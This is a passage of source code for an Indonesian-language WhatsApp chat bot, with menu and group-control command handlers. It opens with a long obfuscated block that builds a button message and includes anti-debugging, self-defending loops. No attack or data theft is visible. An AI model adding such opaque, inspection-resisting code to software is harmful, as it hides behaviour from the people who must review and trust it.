buttons=[_0x37a180,_0x4e36a5,_0x2f08b4],_0x1c4954={};_0x1c4954[_0x2fbce3(0x1dc,0x1dc,0x188,0x161,0x1ed)+_0x42ad0a(0x480,0x409,0x473,0x3a9,0x36a)+'t']=_0x19cd64(0x2b6,0x33e,0x272,0x298,0x2ed)+_0x42ad0a(0x312,0x334,0x29d,0x2bd,0x300)+pushname+(_0x2a2c91(0x1d7,0x1cf,0x1d7,0x113,0x1b1)+_0x2fbce3(0x1a2,0xaa,0x112,0x101,0xcf)+_0x42ad0a(0x264,0x2e9,0x269,0x273,0x240)+_0x2a2c91(0x152,0x14a,0xb3,0x13d,0xf4)+_0x2a2c91(0xb6,0xca,0xce,0x91,0xbc)+_0x2a2c91(0x1de,0xf9,0xe6,0x1e2,0x136)+_0x4834ce(0x151,0x108,0x150,0x1d7,0xc9)+_0x19cd64(0x2b5,0x1f2,0x2ab,0x287,0x245)+_0x2a2c91(0x104,0x16f,0x119,0x166,0x191)+'kk'),_0x1c4954[_0x42ad0a(0x2b9,0x33d,0x34f,0x2ee,0x332)+_0x19cd64(0x278,0x2b7,0x256,0x2ee,0x37f)]=''+creator,_0x1c4954[_0x2fbce3(0x126,0xe3,0x176,0x1d0,0x19e)+'ns']=buttons,_0x1c4954[_0x4834ce(0x1ab,0x1a5,0x176,0xeb,0x201)+_0x2a2c91(0x14b,0xcd,0xdd,0xbd,0xb2)]=0x4,_0x1c4954[_0x2fbce3(0x1e4,0x173,0x166,0x126,0x203)+_0x2fbce3(0x190,0x1c8,0x1b2,0x189,0x144)+'ge']=media[_0x2a2c91(0x11b,0x15e,0x225,0x17f,0x17a)+'ge'][_0x2fbce3(0x10f,0x147,0x166,0x115,0x150)+_0x42ad0a(0x391,0x3b2,0x37e,0x3fc,0x32e)+'ge'];const btn=_0x1c4954,_0x4c95c4={};_0x4c95c4[_0x2fbce3(0x142,0x69,0xd0,0x36,0xad)]=hahh+'\x20'+pushname,_0x4c95c4[_0x19cd64(0x241,0x1b0,0x1d9,0x1b6,0x25c)]=''+baper,_0x4c95c4[_0x2fbce3(0xeb,0x96,0xd1,0x11e,0x144)+_0x2fbce3(0x260,0x1d6,0x1dc,0x20b,0x13a)+'e']=_0x2a2c91(0x1a5,0xdd,0xeb,0xf4,0x151),_0x4c95c4[_0x2a2c91(0xc7,0xa1,0x127,0x8e,0xad)+_0x4834ce(0x114,0x13e,0x184,0x1fb,0x18f)+'rl']=''+img,_0x4c95c4[_0x2a2c91(0x91,0x2,0xd1,0x11f,0xad)+_0x4834ce(0x135,0x101,0x115,0x6a,0xbc)]='',_0x4c95c4[_0x42ad0a(0x34f,0x3c7,0x3de,0x3a7,0x401)+_0x19cd64(0x2bb,0x1aa,0x1c1,0x228,0x253)]=''+apiku;function _0x19cd64(_0x1b2ca2,_0x443dfd,_0x157da9,_0x1ddf43,_0x2e7630){return _0x3198(_0x1ddf43- -0x22,_0x157da9);}const _0xb0e22f={};_0xb0e22f[_0x2fbce3(0x18c,0x180,0xed,0xa0,0xa8)]='hi',_0xb0e22f[_0x2a2c91(0x15c,0xb4,0xcb,0x171,0xfb)+_0x2fbce3(0xcf,0xba,0x124,0x166,0xf3)+_0x2fbce3(0xf8,0xf5,0x190,0x16f,0x220)]=0x3b9aca00,_0xb0e22f[_0x42ad0a(0x402,0x37c,0x3ce,0x300,0x3c2)+_0x4834ce(0x111,0x100,0x10e,0x103,0x1a3)+'d']=!![],_0xb0e22f[_0x19cd64(0x16c,0x178,0x225,0x215,0x2c1)+_0x2fbce3(0x144,0x1d5,0x1d0,0x155,0x225)+_0x2fbce3(0x1d3,0x181,0x20c,0x251,0x2b0)]=!![],_0xb0e22f[_0x19cd64(0x22f,0x18b,0x2c2,0x22a,0x190)+_0x42ad0a(0x3e5,0x3fe,0x3b4,0x3ec,0x38b)+_0x2fbce3(0x10a,0x14f,0x19d,0x1fd,0x10f)]=_0x4c95c4,alpha[_0x4834ce(0x8a,0xb2,0xd9,0x15a,0x11e)+_0x2fbce3(0x1ba,0x105,0x11f,0x12c,0x1a2)+'e'](from,btn,MessageType[_0x19cd64(0x231,0x247,0x237,0x241,0x2bc)+_0x4834ce(0x3f,0x8a,0x84,0x20,0x4e)+_0x42ad0a(0x440,0x39c,0x36c,0x3de,0x427)],{'thumbnail':fs[_0x4834ce(0x137,0x154,0x156,0xdf,0x15f)+_0x2a2c91(0x152,0xf9,0x66,0xde,0xeb)+'nc'](_0x2a2c91(0x1de,0x18e,0x1ab,0xc6,0x134)+'/'+thumbnail),'caption':_0x2fbce3(0x17f,0x12f,0x169,0x1fe,0x1db)+_0x2fbce3(0x15f,0x218,0x19b,0x110,0x192)+'21','contextInfo':_0xb0e22f,'quoted':ftoko,'sendEphemeral':!![]});function _0x83adbf(_0x39c7b6){function _0x4c17a4(_0x120ff4,_0x2e4d43,_0x5dddf6,_0x331a62,_0x2b6c3d){return _0x2a2c91(_0x120ff4,_0x2e4d43-0x1c1,_0x5dddf6-0xc0,_0x331a62-0x62,_0x2b6c3d- -0x74);}const _0x3516dd={'SovyU':function(_0x53c32c,_0x23e909){return _0x53c32c(_0x23e909);},'HUpdq':function(_0x266be9){return _0x266be9();},'DvCVm':function(_0x1822ad,_0x2a18e9){return _0x1822ad!==_0x2a18e9;},'HbeCs':_0x42a424(0x448,0x46b,0x45c,0x3be,0x3c2),'NlZaB':_0x42a424(0x4b4,0x4ed,0x4a3,0x4aa,0x42c),'SeGfa':function(_0x3fdf4f,_0x3ba871){return _0x3fdf4f===_0x3ba871;},'MURbx':_0x42a424(0x41c,0x4a7,0x457,0x3e2,0x4b4),'IBMwO':_0x5bbc34(-0x108,-0x147,-0x15b,-0x134,-0x1ab)+_0x42a424(0x54b,0x5b4,0x4ce,0x587,0x4c5)+_0x4c17a4(0x1f,-0x14,-0x1c,0x4b,0x66)+_0x356fd7(-0x10c,-0xad,-0x31,-0xc8,-0xae)+'/','zdehy':_0x42a424(0x548,0x551,0x4f3,0x49c,0x4b8)+_0x5bbc34(-0x189,-0x13f,-0x1ee,-0x1ab,-0x236)+_0x5bbc34(-0x97,-0x34,-0xeb,-0xd9,-0x105)+_0x4c17a4(0x109,0x95,0xb9,0xe1,0xe4)+_0x42a424(0x513,0x4c7,0x539,0x4c8,0x518),'CBAQR':function(_0x28ee16,_0x5499a1){return _0x28ee16+_0x5499a1;},'QQrjO':_0x4c17a4(0xf,0xa5,0x52,0xf1,0xa3),'fMOoI':_0x4c17a4(0xec,0x63,0x6d,0x76,0xbd),'dzuwM':_0x42a424(0x537,0x4ec,0x4a8,0x4b7,0x5c9)+_0x1092d1(0xcc,0x184,0x178,0x107,0x1a3)+'t','BinDT':_0x1092d1(0x147,0x7f,0x114,0x7b,0x122),'vqkAj':_0x5bbc34(-0x185,-0x20b,-0x234,-0x1ce,-0x27a),'paaiV':_0x5bbc34(-0xb1,-0x1b1,-0x10a,-0x106,-0x9a)+'g','VQnsO':function(_0x53352e,_0x4603c8){return _0x53352e===_0x4603c8;},'AeiDk':_0x42a424(0x4fc,0x4f6,0x501,0x4ca,0x579),'TwufX':_0x42a424(0x533,0x551,0x4d6,0x4fd,0x527),'DgaOb':_0x356fd7(-0x250,-0x1a8,-0x244,-0x1ad,-0x1cc)+_0x1092d1(0x124,0x1a3,0x16e,0x1fb,0x20f)+_0x4c17a4(0xa5,0x14c,0x160,0x13a,0xfc),'mZNWB':_0x4c17a4(0x60,0x73,0xdb,0x32,0xd9)+'er','sOAsn':_0x5bbc34(-0x39,-0x3d,-0xad,-0xd3,-0x4e),'tIKrb':_0x1092d1(0xb8,0xb7,0x60,0x1e,-0x12),'vKbqC':function(_0x150dbf,_0x4fe5d8){return _0x150dbf+_0x4fe5d8;},'KinBN':function(_0x4c9545,_0x3130ec){return _0x4c9545/_0x3130ec;},'uHfsC':_0x356fd7(-0x138,-0x201,-0x139,-0x1be,-0x232)+'h','uKrQQ':function(_0x13e139,_0x385819){return _0x13e139===_0x385819;},'iJltZ':function(_0x27821a,_0x523958){return _0x27821a%_0x523958;},'yfuVg':_0x42a424(0x50e,0x54a,0x4ac,0x5a5,0x53b),'RoIzf':_0x1092d1(0x24,0xa2,0x62,-0x36,0x83),'OxDVU':function(_0x364238,_0x260499){return _0x364238+_0x260499;},'QsthJ':_0x4c17a4(0x13d,0x1ec,0x1dc,0x1fc,0x170)+'n','DMEBf':_0x1092d1(0x8f,0xbd,0x133,0xef,0x140),'xpXbR':function(_0x556473,_0x5a2c6c){return _0x556473+_0x5a2c6c;},'MqKKm':function(_0x5064ae,_0x45322a){return _0x5064ae+_0x45322a;},'hrowH':_0x1092d1(0x7d,-0x4,0x6a,-0xf,0x1b)+_0x1092d1(0x1cf,0x1a0,0x14d,0xe2,0xda)+_0x5bbc34(-0x38,-0x69,-0x41,-0x9f,-0xba)+')','ZrJFh':_0x42a424(0x4cc,0x432,0x505,0x4fe,0x485)+_0x5bbc34(-0x126,-0x7c,-0x121,-0x104,-0x14f)+_0x4c17a4(-0x1,0xfa,0x11a,0x131,0xa2)+_0x4c17a4(-0x3c,0x52,0x3e,-0x3,0x37)+_0x4c17a4(0x115,0x172,0xce,0x10d,0x15f)+_0x356fd7(-0x182,-0x205,-0x23a,-0x1bf,-0x24c)+_0x5bbc34(-0x1e1,-0x18d,-0x1d5,-0x19a,-0x190),'JrIgf':function(_0x548cef,_0x5f33e8){return _0x548cef(_0x5f33e8);},'XSBQo':_0x1092d1(0x134,0x184,0x10b,0x8f,0x130),'kQeFq':_0x4c17a4(0x8a,-0x6,0x5e,0x5c,0x30),'KZibY':_0x356fd7(-0x1fd,-0x125,-0x1e3,-0x16f,-0x147),'Ylxvd':function(_0x4f99e5){return _0x4f99e5();},'niuWL':_0x4c17a4(0xef,0x125,0x13b,0x91,0xef),'BtVTw':_0x4c17a4(0x12a,0x112,0x1a3,0x13e,0x111),'YUXCl':_0x42a424(0x4c9,0x472,0x46c,0x475,0x4ba),'CjHCk':function(_0x229717,_0x27c95f){return _0x229717===_0x27c95f;},'DuBdc':_0x4c17a4(0xc0,0x83,-0x12,0x101,0x7a)};function _0x356fd7(_0x587ba1,_0x468db7,_0x33f3b1,_0x497f64,_0x492ccb){return _0x4834ce(_0x587ba1-0x12,_0x468db7-0x5f,_0x497f64- -0x26a,_0x468db7,_0x492ccb-0x167);}function _0x3f9e8f(_0x1fc733){const _0x499a50={'hTBSw':function(_0x271bd8,_0x4e85c5){function _0x1b79ed(_0x2e31c1,_0x41f6c4,_0x388f1d,_0xa1de8a,_0xd0b6bc){return _0x3198(_0xa1de8a-0x90,_0x2e31c1);}return _0x3516dd[_0x1b79ed(0x2a1,0x29a,0x25b,0x2ce,0x2ac)](_0x271bd8,_0x4e85c5);},'HJpgq':_0x3516dd[_0x337d9e(0x33c,0x378,0x3e8,0x35f,0x417)],'aHMMD':_0x3516dd[_0x283598(0x38a,0x41f,0x423,0x40e,0x44d)],'KQLQk':_0x3516dd[_0x283598(0x38d,0x2f4,0x352,0x294,0x368)],'ZhRgv':function(_0x102358,_0x1d5eb2){function _0x53c51b(_0x2fa4e8,_0x5af065,_0x478299,_0x197f60,_0x528c5e){return _0x283598(_0x2fa4e8-0x11c,_0x528c5e-0x109,_0x478299-0x1eb,_0x197f60-0x1f0,_0x478299);}return _0x3516dd[_0x53c51b(0x53d,0x4fd,0x43d,0x55d,0x4bb)](_0x102358,_0x1d5eb2);},'YGiZa':_0x3516dd[_0x283598(0x44c,0x3d0,0x35a,0x355,0x466)],'YcPYb':_0x3516dd[_0x54d14b(0x543,0x4e7,0x553,0x5dc,0x5eb)],'QoccC':_0x3516dd[_0x41e2d6(0x19e,0x121,0xd5,0x10c,0xa5)]};function _0x3a8495(_0x4e981e,_0x34698c,_0x18cc82,_0x16eab4,_0x5caa61){return _0x4c17a4(_0x4e981e,_0x34698c-0x87,_0x18cc82-0x134,_0x16eab4-0x115,_0x5caa61-0x20c);}function _0x337d9e(_0x339a69,_0x56ad7a,_0x3c9fb2,_0x58f9dc,_0x1aeb3a){return _0x4c17a4(_0x3c9fb2,_0x56ad7a-0x149,_0x3c9fb2-0x32,_0x58f9dc-0x1a2,_0x56ad7a-0x27d);}function _0x41e2d6(_0x2cccbd,_0x1b41fe,_0x5ef370,_0xabaee9,_0x4f6875){return _0x1092d1(_0x4f6875,_0x1b41fe-0x58,_0xabaee9-0x26,_0xabaee9-0x142,_0x4f6875-0x5d);}function _0x283598(_0x3bf2fd,_0xa891dc,_0x4b9dcb,_0x3cbebb,_0x10e201){return _0x356fd7(_0x3bf2fd-0x23,_0x10e201,_0x4b9dcb-0x188,_0xa891dc-0x4ed,_0x10e201-0xd1);}function _0x54d14b(_0x31a72d,_0x22e8e0,_0x13db2f,_0x3c7ca3,_0x134ebc){return _0x4c17a4(_0x22e8e0,_0x22e8e0-0x139,_0x13db2f-0x1f4,_0x3c7ca3-0x17c,_0x31a72d-0x477);}if(_0x3516dd[_0x337d9e(0x339,0x3ce,0x33a,0x448,0x40b)](_0x3516dd[_0x54d14b(0x563,0x5d3,0x5b1,0x5ed,0x5a8)],_0x3516dd[_0x283598(0x41f,0x440,0x4a2,0x3fb,0x44a)])){if(_0x3516dd[_0x283598(0x319,0x376,0x2dc,0x340,0x30c)](typeof _0x1fc733,_0x3516dd[_0x41e2d6(0x166,0x4e,0xdf,0xeb,0x10a)])){if(_0x3516dd[_0x283598(0x401,0x3b1,0x333,0x385,0x391)](_0x3516dd[_0x283598(0x3bb,0x446,0x3f9,0x3ff,0x3c5)],_0x3516dd[_0x337d9e(0x3e9,0x3ec,0x371,0x3ee,0x3ff)])){const _0x5c6ca0=_0x253787[_0x41e2d6(0x118,0x9a,0xc3,0x118,0xa0)](_0x1c6319,arguments);return _0xe49c46=null,_0x5c6ca0;}else return function(_0x208c96){}[_0x3a8495(0x2b6,0x21a,0x267,0x290,0x29e)+_0x54d14b(0x5ca,0x5a6,0x668,0x592,0x559)+'r'](_0x3516dd[_0x337d9e(0x2f0,0x312,0x351,0x399,0x2ec)])[_0x54d14b(0x556,0x57d,0x56f,0x5be,0x571)](_0x3516dd[_0x337d9e(0x3b5,0x3cf,0x3f7,0x3ec,0x479)]);}else{if(_0x3516dd[_0x337d9e(0x39d,0x3ce,0x414,0x466,0x37f)](_0x3516dd[_0x3a8495(0x211,0x1d0,0x24b,0x2ec,0x252)],_0x3516dd[_0x54d14b(0x555,0x547,0x551,0x4d2,0x589)])){if(_0x3516dd[_0x337d9e(0x465,0x3ce,0x3a2,0x355,0x43a)](_0x3516dd[_0x283598(0x3c4,0x363,0x318,0x2ca,0x2f7)]('',_0x3516dd[_0x283598(0x303,0x329,0x345,0x29f,0x39a)](_0x1fc733,_0x1fc733))[_0x3516dd[_0x54d14b(0x51f,0x484,0x51f,0x50b,0x569)]],-0x24b*0x3+-0x59a+-0x4*-0x31f)||_0x3516dd[_0x54d14b(0x504,0x527,0x58a,0x550,0x574)](_0x3516dd[_0x3a8495(0x28c,0x2b4,0x2bf,0x367,0x315)](_0x1fc733,0x8*-0xbf+-0x159c+0x1ba8),-0xd41+0xd4e+-0xd*0x1)){if(_0x3516dd[_0x3a8495(0x3a7,0x336,0x36d,0x2c1,0x35d)](_0x3516dd[_0x337d9e(0x390,0x377,0x2d1,0x2e8,0x313)],_0x3516dd[_0x41e2d6(0x129,0xf0,0x1c4,0x19a,0x22c)]))(function(){function _0x4510e1(_0x402218,_0x52fc60,_0x30e592,_0x3bea08,_0x32daef){return _0x54d14b(_0x3bea08- -0x459,_0x32daef,_0x30e592-0x9b,_0x3bea08-0x29,_0x32daef-0x36);}function _0x648440(_0x259eec,_0x19d0c6,_0x529f5c,_0x4bd423,_0x29569c){return _0x283598(_0x259eec-0x121,_0x4bd423- -0x369,_0x529f5c-0x1d3,_0x4bd423-0x1a8,_0x29569c);}function _0x96d4c4(_0x4382a4,_0x2d729f,_0x3b3900,_0x34cb8a,_0x3b0afd){return _0x3a8495(_0x2d729f,_0x2d729f-0xad,_0x3b3900-0x10c,_0x34cb8a-0x168,_0x3b0afd-0x5c);}function _0x61f0bf(_0x28be46,_0x26f08f,_0xa2821e,_0x244da1,_0x55c32d){return _0x283598(_0x28be46-0x1cf,_0xa2821e-0xfe,_0xa2821e-0x2b,_0x244da1-0x66,_0x28be46);}if(_0x499a50[_0x4510e1(0xee,0x5d,0x112,0x77,0x109)](_0x499a50[_0x61f0bf(0x3f7,0x3af,0x406,0x3f2,0x38d)],_0x499a50[_0x61f0bf(0x49a,0x38c,0x406,0x3d6,0x478)]))return!![];else{const _0x18366f=_0x4e7dc6[_0x61f0bf(0x4b7,0x491,0x4a8,0x4e0,0x4b1)](_0x5d7e56,arguments);return _0xd0b286=null,_0x18366f;}}[_0x337d9e(0x33c,0x30f,0x287,0x278,0x3b6)+_0x337d9e(0x343,0x3d0,0x468,0x3f7,0x40d)+'r'](_0x3516dd[_0x54d14b(0x4fb,0x495,0x503,0x505,0x526)](_0x3516dd[_0x54d14b(0x57c,0x5f7,0x4f2,0x60f,0x5be)],_0x3516dd[_0x337d9e(0x2e3,0x349,0x3d5,0x3e0,0x3a1)]))[_0x41e2d6(0x11c,0x134,0x22b,0x1a7,0x239)](_0x3516dd[_0x54d14b(0x517,0x573,0x5a2,0x47b,0x4a3)]));else{if(_0xdf9d7f)return _0x1b1879;else _0x3516dd[_0x283598(0x316,0x351,0x36c,0x334,0x35b)](_0x54798e,-0x583*0x5+-0x1*0x1b98+0x3727);}}else{if(_0x3516dd[_0x3a8495(0x364,0x360,0x2f8,0x2d9,0x35d)](_0x3516dd[_0x3a8495(0x36c,0x39e,0x381,0x2d1,0x337)],_0x3516dd[_0x3a8495(0x343,0x328,0x3be,0x33f,0x337)])){const _0x534edd=function(){function _0x33c0da(_0x8fa40f,_0xfd0489,_0x30ad33,_0xdb82c9,_0x76c07b){return _0x3a8495(_0xdb82c9,_0xfd0489-0x78,_0x30ad33-0xd1,_0xdb82c9-0x54,_0x30ad33-0x365);}function _0x356e3d(_0x114c9c,_0xcce525,_0x50641d,_0x1db066,_0x3fdfb0){return _0x283598(_0x114c9c-0x11a,_0x3fdfb0-0x14e,_0x50641d-0x159,_0x1db066-0x147,_0x1db066);}function _0x2b42a5(_0x5ecd20,_0x3ffbef,_0x4c0284,_0x5bf727,_0x4d0dcc){return _0x337d9e(_0x5ecd20-0x8b,_0x5ecd20- -0x253,_0x5bf727,_0x5bf727-0xf3,_0x4d0dcc-0x10a);}function _0x2b82a2(_0x273378,_0x5d6282,_0x452b28,_0x5bfda2,_0x371e7d){return _0x283598(_0x273378-0x1b6,_0x452b28- -0x33f,_0x452b28-0x14b,_0x5bfda2-0x1b,_0x5bfda2);}const _0x2dfef3=_0x534edd[_0x356e3d(0x4b9,0x486,0x442,0x461,0x4ab)+_0x2b82a2(0x11b,0xa9,0xdf,0x62,0xb7)+'r'](_0x499a50[_0x4447f8(-0xb2,-0x60,-0x45,-0xb4,-0x142)])()[_0x356e3d(0x506,0x550,0x48b,0x504,0x4ab)+_0x356e3d(0x5df,0x4e8,0x525,0x555,0x56c)+'r'](_0x499a50[_0x2b82a2(0xc6,0x31,0x7f,-0x15,-0x24)]);function _0x4447f8(_0x5a4833,_0xbdca92,_0x21e5ff,_0x1a728a,_0xcbbb8b){return _0x337d9e(_0x5a4833-0xa0,_0x1a728a- -0x409,_0xbdca92,_0x1a728a-0x172,_0xcbbb8b-0xf);}return!_0x2dfef3[_0x33c0da(0x59c,0x57a,0x5bf,0x5c8,0x5a0)](_0x357a26);};return _0x3516dd[_0x337d9e(0x31a,0x352,0x38c,0x2db,0x30e)](_0x534edd);}else(function(){function _0x1242f6(_0x10904f,_0x2994dc,_0x15d5e2,_0x303e20,_0x1d773e){return _0x54d14b(_0x2994dc- -0x2de,_0x1d773e,_0x15d5e2-0x1b6,_0x303e20-0x1bc,_0x1d773e-0x14a);}function _0x11e902(_0x46f911,_0x33e148,_0x2c4954,_0x3d064c,_0x3c0855){return _0x54d14b(_0x3c0855- -0x17f,_0x33e148,_0x2c4954-0x13e,_0x3d064c-0x128,_0x3c0855-0x157);}function _0x190272(_0x12a63f,_0x171515,_0x5af20f,_0x5e9f3c,_0x5f5319){return _0x283598(_0x12a63f-0x1e2,_0x12a63f- -0x17a,_0x5af20f-0x1a4,_0x5e9f3c-0x175,_0x5af20f);}function _0x15647f(_0x34d189,_0x2f58dd,_0x353281,_0x100fee,_0x5f17a5){return _0x283598(_0x34d189-0x81,_0x34d189-0x9f,_0x353281-0x12f,_0x100fee-0x1bb,_0x2f58dd);}function _0x1bb433(_0x8439f8,_0xb99d45,_0x140675,_0x3373ec,_0x45712b){return _0x337d9e(_0x8439f8-0x154,_0x45712b- -0xc,_0x3373ec,_0x3373ec-0x14f,_0x45712b-0x17);}if(_0x3516dd[_0x1242f6(0x327,0x2ea,0x2e6,0x312,0x2c7)](_0x3516dd[_0x11e902(0x500,0x4da,0x4e0,0x4dc,0x465)],_0x3516dd[_0x11e902(0x438,0x4c6,0x41a,0x43e,0x431)]))return![];else(function(){return![];}[_0x190272(0x1e3,0x1af,0x187,0x1d4,0x23f)+_0x1242f6(0x263,0x2ec,0x33e,0x274,0x2e1)+'r'](_0x499a50[_0x190272(0x29f,0x223,0x344,0x247,0x28a)](_0x499a50[_0x15647f(0x399,0x3b5,0x312,0x32e,0x3d7)],_0x499a50[_0x1242f6(0x2ac,0x221,0x238,0x25c,0x243)]))[_0x190272(0x230,0x1d9,0x195,0x295,0x26b)](_0x499a50[_0x190272(0x1c3,0x190,0x1be,0x205,0x1de)]));}[_0x283598(0x3bb,0x35d,0x2d7,0x356,0x3f5)+_0x41e2d6(0x176,0x170,0x1a7,0x18c,0x21e)+'r'](_0x3516dd[_0x41e2d6(0xc7,0xc1,0xd1,0xf3,0x16a)](_0x3516dd[_0x3a8495(0x390,0x291,0x342,0x293,0x311)],_0x3516dd[_0x41e2d6(0x118,0x8d,0xc2,0x105,0x17f)]))[_0x54d14b(0x556,0x4ff,0x5a3,0x5b7,0x56c)](_0x3516dd[_0x3a8495(0x2bd,0x2cf,0x332,0x338,0x2df)]));}}else{const _0x38025c=_0x3a149f?function(){function _0x4a12e9(_0x321ca0,_0x269fe9,_0x20711f,_0x46b24d,_0xda21f3){return _0x41e2d6(_0x321ca0-0x4e,_0x269fe9-0x111,_0x20711f-0x18e,_0x321ca0- -0xf6,_0x46b24d);}if(_0x263a78){const _0x2b8f87=_0x36f064[_0x4a12e9(0x22,0x85,0xc,0x6d,-0x7)](_0x10e398,arguments);return _0x26c8e0=null,_0x2b8f87;}}:function(){};return _0x478803=![],_0x38025c;}}_0x3516dd[_0x3a8495(0x22c,0x2a0,0x32f,0x2a2,0x292)](_0x3f9e8f,++_0x1fc733);}else return!![];}function _0x5bbc34(_0x11b42b,_0x155064,_0x31bcdf,_0x5f213a,_0x3cfcc4){return _0x2fbce3(_0x11b42b-0xe8,_0x155064-0x7c,_0x5f213a- -0x2ae,_0x31bcdf,_0x3cfcc4-0x1b1);}function _0x1092d1(_0x25634c,_0x315cdb,_0x34febe,_0x2b3e31,_0x26b374){return _0x4834ce(_0x25634c-0xeb,_0x315cdb-0x15,_0x34febe- -0x35,_0x25634c,_0x26b374-0xb4);}function _0x42a424(_0x35ad91,_0x1bad02,_0x5ca103,_0x29e08a,_0x5b5624){return _0x19cd64(_0x35ad91-0x15a,_0x1bad02-0x83,_0x29e08a,_0x35ad91-0x25b,_0x5b5624-0x116);}try{if(_0x3516dd[_0x356fd7(-0x1a9,-0x1b9,-0x232,-0x195,-0x108)](_0x3516dd[_0x1092d1(0x97,0xb8,0x49,0x2a,0xb4)],_0x3516dd[_0x4c17a4(0x129,0x14c,0x10d,0x168,0x168)]))(function(){return!![];}[_0x356fd7(-0x1ca,-0x1b6,-0x133,-0x190,-0x146)+_0x356fd7(-0x4f,-0xda,-0xc7,-0xcf,-0x3c)+'r'](_0x3516dd[_0x42a424(0x42b,0x3d0,0x3ab,0x3b2,0x4ab)](_0x3516dd[_0x5bbc34(-0x8a,-0x148,-0x10c,-0x103,-0x72)],_0x3516dd[_0x356fd7(-0x105,-0x1e3,-0x11c,-0x156,-0x141)]))[_0x356fd7(-0xdc,-0x71,-0xbe,-0xb4,-0x23)](_0x3516dd[_0x356fd7(-0x136,-0x128,-0x159,-0x182,-0x104)]));else{if(_0x39c7b6){if(_0x3516dd[_0x42a424(0x51d,0x4c8,0x51d,0x549,0x487)](_0x3516dd[_0x42a424(0x4cf,0x4f6,0x54c,0x496,0x578)],_0x3516dd[_0x356fd7(-0x18e,-0x149,-0x139,-0x11f,-0x181)])){const _0x506451=_0x490af3[_0x4c17a4(0xb7,0x117,0x67,0xe8,0x92)+_0x356fd7(-0xec,-0x122,-0x159,-0xcf,-0x145)+'r'](_0x3516dd[_0x5bbc34(-0x2f,-0x117,-0x10e,-0xb4,-0x7b)])()[_0x42a424(0x45e,0x3c2,0x40b,0x4c9,0x45e)+_0x5bbc34(-0x94,-0x154,-0x14a,-0xb5,-0x6e)+'r'](_0x3516dd[_0x1092d1(0x41,-0x2,0x3c,0x4a,-0x1c)]);return!_0x506451[_0x5bbc34(-0x1bf,-0x162,-0x21a,-0x1ba,-0x174)](_0x3ace35);}else return _0x3f9e8f;}else{if(_0x3516dd[_0x4c17a4(0x8,0x127,0x54,0x75,0x9f)](_0x3516dd[_0x5bbc34(-0x13b,-0xfe,-0x1a1,-0x125,-0x7f)],_0x3516dd[_0x4c17a4(0x3d,0x4f,0x13c,0xd4,0xe3)]))_0x3516dd[_0x5bbc34(-0x15c,-0xfc,-0x137,-0x141,-0x15e)](_0x3f9e8f,0x15aa+0x1cfa+-0x32a4);else{const _0x5cfd57=new _0x29ddeb(_0x3516dd[_0x356fd7(-0x1b3,-0xef,-0x1b7,-0x16a,-0x112)]),_0x346a1a=new _0x50bef6(_0x3516dd[_0x42a424(0x518,0x5bc,0x59d,0x5c2,0x551)],'i'),_0x2cc5ca=_0x3516dd[_0x1092d1(0x182,0x50,0xda,0xee,0xdf)](_0x489719,_0x3516dd[_0x42a424(0x449,0x4cc,0x4dd,0x423,0x3b7)]);!_0x5cfd57[_0x5bbc34(-0x162,-0x193,-0x1a9,-0x1ba,-0x25e)](_0x3516dd[_0x42a424(0x42b,0x43f,0x463,0x492,0x39b)](_0x2cc5ca,_0x3516dd[_0x5bbc34(-0x12a,-0x15f,-0x19c,-0x127,-0x1d2)]))||!_0x346a1a[_0x5bbc34(-0x1ed,-0x191,-0x18c,-0x1ba,-0x1ac)](_0x3516dd[_0x1092d1(0x36,0xcd,0x72,0x14,0xc3)](_0x2cc5ca,_0x3516dd[_0x1092d1(0xb2,0xb4,0x100,0xbe,0x97)]))?_0x3516dd[_0x42a424(0x493,0x435,0x470,0x49b,0x407)](_0x2cc5ca,'0'):_0x3516dd[_0x4c17a4(0x156,0x1ce,0x126,0xab,0x155)](_0xadb9f4);}}}}catch(_0x5afa6d){}}
break
    /*case prefix+ 'menu':
    case prefix+ 'help':
                var itsme = `${numbernye}@s.whatsapp.net`
				var split = `${fake}`
				wew = fs.readFileSync(`image/${thumbnail}`)
				const bruhhhh = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
    	alphay = `━━ ❲ *SIMPLE BOT WEA* ❳ ━━
${hahh} ${pushname}

◯ *NEW YEAR* 🎊
*${ultah}*

◯ *INFORMATION*
${petik}⤷ Owner : ${setting.ownername}
⤷ Bot Name : ${setting.botname}
⤷ Prefix : [ ${prefix} ]
⤷ Date : ${thisDay},${day} ${myMonths[bulan]} ${year}
⤷ Time : ${timuu}  WIB${petik}

*LIST MENU*
${petik}❒ ${prefix}convertmenu
❒ ${prefix}downloadmenu
❒ ${prefix}funmenu
❒ ${prefix}makermenu
❒ ${prefix}othermenu
❒ ${prefix}ownermenu
❒ ${prefix}storagemenu
❒ ${prefix}tagmenu
❒ ${prefix}upmenu${petik}

*ABOUT*
${petik}❒ ${prefix}source
❒ ${prefix}mystat
❒ ${prefix}speed
❒ ${prefix}status
❒ ${prefix}runtime${petik}

*TQTO*
━━ ❲ *SIMPLE BOT WEA* ❳ ━━ 
`
            await alpha.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`image/${thumbnail}`), quoted: ftroli ,caption:  help(prefix,hahh,pushname,ownername,status), contextInfo: {"mentionedJid": [alfa], "forwardingScore":999,"isForwarded":true},sendEphemeral: true})
  break*/
   case prefix+'menu2': 
                let pi = alpha.prepareMessageFromContent(from, {
           "listMessage": {
						"title": "⌜ MENU KE -2 ⌟",
						"description": `${hahh} ${pushname}`,
						"buttonText": "𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ⌕",
						"listType": "SINGLE_SELECT",
						"sections": [
							{
								"title": "Pilih salah satu tod",
								"rows": [
									{
										"title": "convertmenu",
										"rowId": "0"
									},
									{
										"title": "downloadmenu",
										"rowId": "0"
									},
									{
										"title": "funmenu",
										"rowId": "0"
									},
									{
										"title": "makermenu",
										"rowId": "0"
									},
									{
										"title": "othermenu",
										"rowId": "0"
									},
									{
										"title": "ownermenu",
										"rowId": "0"
									},
									{
										"title": "storagemenu",
										"rowId": "0"
									},
									{
										"title": "tagmenu",
										"rowId": "0"
									},
									{
										"title": "upmenu",
										"rowId": "0"
									}
								]
							}
						]
					}}, {})
 alpha.relayWAMessage(pi, {waitForAck: true})
                break
   case prefix+'group': 
   case prefix+'gc': 
                let po = alpha.prepareMessageFromContent(from, {
					"listMessage":{
                  "title": `Hi ${pushname}`,
                  "description": "Pilih open/close",
                  "buttonText": "SELECT",
                  "listType": "SINGLE_SELECT",
                  "sections": [
                     {
                        "rows": [
                           {
                              "title": "group open",
                              "rowId": `group open`
